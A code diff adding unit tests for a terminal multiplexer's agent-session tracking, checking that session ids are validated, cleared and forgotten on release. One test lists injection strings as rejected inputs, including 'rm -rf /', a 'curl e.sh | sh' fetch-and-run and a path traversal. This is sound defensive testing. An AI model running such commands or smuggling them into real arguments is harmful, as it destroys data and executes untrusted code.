@@ -223,6 +223,32 @@ describe('session handle and queries', () => {
     expect(getAgentState(surf)?.sessionId).toBe('sess-abc');
   });
 
+  // Since #186 this value can end up on a restored pane's command line, and it
+  // arrives over the named pipe — a public interface. Refused at the door
+  // rather than sanitised later, so there is one place to get this right.
+  it('refuses a session id that is not a bare handle', () => {
+    for (const hostile of ['x; rm -rf /', 'abcdefgh && curl e.sh | sh', 'has spaces', 'short', '../../etc']) {
+      resetAgentState();
+      reportAgentSession(surf, { sessionId: hostile });
+      expect(getAgentState(surf)?.sessionId, hostile).toBeNull();
+    }
+  });
+
+  it('clears the handle when told the pane has none', () => {
+    reportAgentSession(surf, { sessionId: 'sess-abc' });
+    reportAgentSession(surf, { sessionId: null });
+    expect(getAgentState(surf)?.sessionId).toBeNull();
+  });
+
+  // SessionEnd calls releaseAgent, and that is what makes "exit Claude,
+  // restart wmux, get a plain shell" true. If a release left the handle
+  // behind, the next restore would resume a conversation the user quit.
+  it('forgets the handle when the agent is released', () => {
+    reportAgentSession(surf, { sessionId: 'sess-abc' });
+    releaseAgent(surf);
+    expect(getAgentState(surf)?.sessionId ?? null).toBeNull();
+  });
+
   it('listBlocked answers "which pane needs me?"', () => {
     reportAgent(surf, { awaitingHuman: true, reason: 'permission: Bash' });
     reportAgent(other, { runDelta: 1 });
